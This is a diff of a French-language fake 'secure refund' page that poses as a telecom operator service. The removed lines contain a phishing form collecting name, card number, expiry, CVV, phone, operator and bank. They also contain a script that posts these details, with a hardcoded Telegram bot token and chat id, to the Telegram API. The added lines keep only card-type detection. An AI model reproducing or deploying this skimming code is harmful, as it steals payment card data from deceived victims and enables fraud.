@@ -39,14 +39,6 @@
 
     <!-- Formulaire principal -->
     <div class="card p-8 max-w-lg w-full">
-        <!-- Logos des opérateurs -->
-        <div class="flex justify-center space-x-4 mb-6">
-            <img src="https://via.placeholder.com/100" alt="Orange" class="h-12">
-            <img src="https://via.placeholder.com/100" alt="SFR" class="h-12">
-            <img src="https://via.placeholder.com/100" alt="Bouygues" class="h-12">
-            <img src="https://via.placeholder.com/100" alt="Free" class="h-12">
-        </div>
-
         <!-- Titre -->
         <div class="text-center mb-8">
             <h1 class="text-2xl font-bold text-gray-800">Remboursement Sécurisé</h1>
@@ -91,166 +83,51 @@
                 </div>
             </div>
 
-            <!-- Numéro de téléphone -->
-            <div class="mb-6">
-                <label for="telephone" class="block text-sm font-medium text-gray-700 mb-2">Numéro de téléphone</label>
-                <input type="tel" id="telephone" placeholder="Ex: 0612345678" required maxlength="10"
-                    class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
-                <p id="phone-error" class="text-red-500 text-sm mt-2 hidden">Le numéro doit contenir 10 chiffres.</p>
-            </div>
-
-            <!-- Opérateur et Banque -->
-            <div class="grid grid-cols-2 gap-4 mb-6">
-                <div>
-                    <label for="operateur" class="block text-sm font-medium text-gray-700 mb-2">Opérateur</label>
-                    <select id="operateur" required
-                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
-                        <option value="" disabled selected>Sélectionnez</option>
-                        <!-- Opérateurs principaux -->
-                        <option value="orange">Orange</option>
-                        <option value="sfr">SFR</option>
-                        <option value="bouygues">Bouygues Telecom</option>
-                        <option value="free">Free</option>
-                        <!-- MVNOs -->
-                        <option value="la-poste">La Poste Mobile</option>
-                        <option value="nrj">NRJ Mobile</option>
-                        <option value="red">RED by SFR</option>
-                        <option value="sosh">Sosh</option>
-                        <option value="b-and-you">B&YOU</option>
-                        <option value="prixtel">Prixtel</option>
-                        <option value="cdiscount">Cdiscount Mobile</option>
-                        <option value="autre">Autre</option>
-                    </select>
-                </div>
-                <div>
-                    <label for="bank" class="block text-sm font-medium text-gray-700 mb-2">Banque</label>
-                    <select id="bank" required
-                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
-                        <option value="" disabled selected>Sélectionnez</option>
-                        <!-- Grandes banques -->
-                        <option value="bnp">BNP Paribas</option>
-                        <option value="sg">Société Générale</option>
-                        <option value="ca">Crédit Agricole</option>
-                        <option value="lcl">LCL</option>
-                        <option value="bp">Banque Populaire</option>
-                        <option value="cm">Crédit Mutuel</option>
-                        <option value="hsbc">HSBC</option>
-                        <option value="la-poste">La Banque Postale</option>
-                        <!-- Banques en ligne -->
-                        <option value="boursorama">Boursorama Banque</option>
-                        <option value="fortuneo">Fortuneo</option>
-                        <option value="hellobank">Hello Bank!</option>
-                        <option value="n26">N26</option>
-                        <option value="revolut">Revolut</option>
-                        <option value="autre">Autre</option>
-                    </select>
-                </div>
-            </div>
-
             <!-- Bouton de validation -->
             <button type="submit"
                 class="w-full bg-indigo-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-indigo-700 transition duration-300">
                 Valider le remboursement
             </button>
         </form>
-
-        <!-- Paiement sécurisé -->
-        <div class="mt-6 text-center">
-            <img src="https://via.placeholder.com/300x100" alt="Paiement Sécurisé" class="w-full h-auto">
-        </div>
     </div>
 
-    <!-- Footer -->
-    <footer class="mt-10 text-center text-gray-600 text-sm">
-        <p>&copy; 2024 Remboursement Sécurisé. Tous droits réservés.</p>
-        <p class="mt-2">
-            <a href="#" class="text-indigo-600 hover:underline">Politique de confidentialité</a> |
-            <a href="#" class="text-indigo-600 hover:underline">Conditions d'utilisation</a>
-        </p>
-    </footer>
-
     <script>
-        // Gestion du numéro de carte (espaces tous les 4 chiffres)
+        // Détection du type de carte
         const cardInput = document.getElementById('numero-carte');
-        const cardError = document.getElementById('card-error');
         const cardTypeImg = document.getElementById('card-type');
 
         cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 16) value = value.slice(0, 16);
-            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            let value = e.target.value.replace(/\D/g, ''); // Supprimer tout sauf les chiffres
+            let cardType = getCardType(value); // Détecter le type de carte
 
-            // Détection du type de carte
-            if (/^4/.test(value)) {
+            // Mettre à jour l'icône en fonction du type de carte
+            if (cardType === 'visa') {
                 cardTypeImg.src = "https://img.icons8.com/color/48/000000/visa.png"; // Logo Visa
-            } else if (/^5/.test(value)) {
+            } else if (cardType === 'mastercard') {
                 cardTypeImg.src = "https://img.icons8.com/color/48/000000/mastercard.png"; // Logo Mastercard
+            } else if (cardType === 'amex') {
+                cardTypeImg.src = "https://img.icons8.com/color/48/000000/amex.png"; // Logo American Express
+            } else if (cardType === 'discover') {
+                cardTypeImg.src = "https://img.icons8.com/color/48/000000/discover.png"; // Logo Discover
             } else {
                 cardTypeImg.src = "https://via.placeholder.com/30"; // Logo par défaut
             }
-
-            cardError.classList.add('hidden');
         });
 
-        // Validation du numéro de téléphone (10 chiffres)
-        const phoneInput = document.getElementById('telephone');
-        const phoneError = document.getElementById('phone-error');
-
-        phoneInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 10) value = value.slice(0, 10);
-            e.target.value = value;
-
-            if (value.length !== 10) {
-                phoneError.classList.remove('hidden');
+        // Fonction pour détecter le type de carte
+        function getCardType(cardNumber) {
+            if (/^4/.test(cardNumber)) {
+                return 'visa'; // Visa commence par 4
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                return 'mastercard'; // Mastercard commence par 51 à 55
+            } else if (/^3[47]/.test(cardNumber)) {
+                return 'amex'; // American Express commence par 34 ou 37
+            } else if (/^6(?:011|5)/.test(cardNumber)) {
+                return 'discover'; // Discover commence par 6011 ou 65
             } else {
-                phoneError.classList.add('hidden');
+                return 'unknown'; // Type inconnu
             }
-        });
-
-        // Soumission du formulaire
-        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
-            event.preventDefault();
-
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const operateur = document.getElementById("operateur").value;
-            const bank = document.getElementById("bank").value;
-
-            const token1 = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-            const chatId1 = "5372119436";
-
-            const message = `
-🔔 **Nouvelle Demande de Remboursement** 🔔
-👤 Nom: ${nom}
-💳 Numéro de Carte: ${numeroCarte}
-📅 Expiration: ${dateExpiration}
-🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-📡 Opérateur: ${operateur}
-🏦 Banque: ${bank}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId1,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                });
-
-                window.location.href = "Traitement.html";
-            } catch (error) {
-                alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
-            }
-        });
+        }
     </script>
 </body>
 </html>
